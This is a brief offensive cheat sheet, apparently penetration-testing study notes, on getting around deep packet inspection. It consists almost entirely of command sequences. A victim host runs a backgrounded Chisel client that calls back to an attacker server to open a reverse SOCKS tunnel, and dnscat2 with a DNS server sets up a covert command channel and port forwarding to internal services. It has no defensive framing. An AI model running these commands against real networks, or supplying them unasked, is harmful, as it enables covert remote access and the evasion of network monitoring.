# Tunneling through Deep Packet Inspection

## Chisel

```
chiselkali$ chisel server --port 8080 --reverse
chiselkali$ sudo tcpdump -nvvvXi ensXpY tcp port 8080
victim$ chisel client $IpChiselKali:8080 R:socks > /dev/null 2>&1 &
chiselkali$ ss -lntpu # check port
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:$portchecked %h %p' userwithpass@hostwithservice
yes
```

## DNS

### Nslookup

```
sudo dnsmasq -C dnsmasq.conf -d
sudo tcpdump -i ensXpY udp port 53
resolvectl status
nslookup somesubzone.mydnsserver.com [victiminternaldns]
```

### Dnscat2

```
dnskali$ dnscat2-server mytld.com
victim$ ./dnscat mytld.com
dnscat2> windows
dnscat2> window -i 1
command> ?
command> listen 127.0.0.1:$AttackerPort $IpDeepIn:$PortService
dnskali$ someservice localhost:$PortService
```
